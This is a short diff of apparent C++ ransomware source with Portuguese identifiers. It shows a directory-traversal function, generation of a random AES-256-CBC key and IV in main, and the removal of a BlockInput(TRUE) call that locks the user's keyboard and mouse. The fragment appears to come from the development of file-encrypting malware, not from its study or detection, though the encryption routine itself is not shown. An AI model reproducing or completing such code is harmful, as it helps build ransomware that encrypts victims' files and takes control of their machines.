@@ -105,7 +105,6 @@ void percorrerDiretorios(const std::string& caminho, const std::vector<unsigned 
 }
  
 int main() {
-    BlockInput(TRUE);
     std::vector<unsigned char> chave(32); 
     std::vector<unsigned char> iv(EVP_CIPHER_iv_length(EVP_aes_256_cbc()));
     if (RAND_bytes(chave.data(), chave.size()) != 1 || RAND_bytes(iv.data(), iv.size()) != 1) {
